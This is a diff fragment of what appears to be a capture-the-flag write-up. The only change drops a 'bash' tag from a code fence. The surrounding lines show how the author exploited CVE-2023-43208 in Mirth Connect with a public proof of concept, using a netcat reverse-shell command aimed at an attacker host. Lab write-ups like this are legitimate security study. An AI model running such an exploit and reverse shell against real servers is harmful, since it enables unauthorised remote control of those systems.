@@ -30,7 +30,7 @@ This can be found here: https://github.com/jakabakos/CVE-2023-43208-mirth-connec
 
 Preparing and executing the payload provides us with a shell on the server:
 
-```bash
+```
 git clone https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc
 cd CVE-2023-43208-mirth-connect-rce-poc
 python3 CVE-2023-43208.py -u https://10.129.89.231/ -c 'busybox nc 10.10.14.16 4444 -e /bin/bash'
